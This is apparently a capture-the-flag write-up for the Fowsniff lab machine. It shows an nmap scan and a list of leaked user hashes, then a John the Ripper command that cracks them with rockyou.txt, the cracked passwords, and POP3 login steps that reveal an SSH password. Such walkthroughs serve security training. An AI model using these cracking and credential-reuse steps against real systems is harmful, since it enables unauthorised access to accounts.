# Scanning

## nmap -A -p- 10.10.162.179
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 05:03 EST
Nmap scan report for 10.10.162.179
Host is up (0.024s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) CAPA RESP-CODES USER TOP PIPELINING UIDL AUTH-RESP-CODE
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: IDLE listed more have LOGIN-REFERRALS post-login AUTH=PLAINA0001 ID OK SASL-IR LITERAL+ IMAP4rev1 capabilities ENABLE Pre-login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.38 seconds

```
## Google Fowsniff: pastebin in twitter account

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

## Decrypt md5 using John the ripper
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-MD5 md5_hash.txt  
```
* Output:
```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```
## POP3 access

* USER seina
* PASS scoobydoo2
* LIST to get all emails
* RETR 1 or 2 to get one email
* SSH password "S1ck3nBluff+secureshell"
